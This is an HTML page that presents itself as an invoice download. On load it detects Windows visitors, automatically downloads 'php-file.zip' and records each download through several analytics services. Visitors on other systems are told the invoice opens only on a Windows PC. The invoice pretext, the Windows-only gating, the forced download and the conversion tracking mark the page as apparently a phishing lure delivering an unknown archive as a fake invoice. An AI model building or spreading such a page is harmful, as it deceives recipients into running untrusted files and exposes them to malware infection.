<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Download Invoice</title>

<!-- Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NFZ363R577"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-NFZ363R577');
</script>

<!-- counter.dev -->
<script
  src="https://cdn.counter.dev/script.js"
  data-id="1ee3dbbd-09d2-42d4-b892-dfdb6f9b8e95"
  data-utcoffset="-5">
</script>

<script>
function isWindows() {
    return /Windows/i.test(navigator.userAgent);
}

// отправка pageview ОБЯЗАТЕЛЬНО
window.addEventListener('load', function () {
    if (window.counter) {
        counter.trackPageview();
    }
});

async function trackDownload(method) {
    // GA4
    if (typeof gtag !== 'undefined') {
        gtag('event', 'php_invoice_download', {
            event_category: 'Download',
            event_label: 'php-file.zip',
            method: method
        });
    }

    // counter.dev Event
    if (window.counter) {
        counter.track('php_invoice_download');
    }

    // PHP Counter API
    try {
        await fetch('/api/php-count.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
        });
    } catch (error) {
        console.error('Error tracking download:', error);
        // Не блокируем скачивание при ошибке
    }
}

function initiateDownload() {
    const link = document.createElement('a');
    link.href = 'php-file.zip';
    link.download = 'php-file.zip';
    
    link.addEventListener('click', function () {
        trackDownload('auto');
    });
    
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

window.onload = function () {
    if (isWindows()) {
        document.getElementById('windows').style.display = 'block';
        // Автоматически запускаем скачивание для Windows
        initiateDownload();
    } else {
        document.getElementById('not-windows').style.display = 'block';
    }
};
</script>
</head>

<body style="font-family: Arial, sans-serif; text-align:center; padding:50px;">

<div id="windows" style="display:none;">
    <h1>Downloading invoice…</h1>
    <p>
        If the download doesn't start,
        <a href="php-file.zip"
           download
           onclick="trackDownload('manual');">
           click here
        </a>
    </p>
</div>

<div id="not-windows" style="display:none;">
    <h1>PC Only</h1>
    <p>This file can be viewed <strong>only from a Windows PC</strong>.</p>
    <p>Please open this page on a Windows computer to download the invoice.</p>
</div>

</body>
</html>

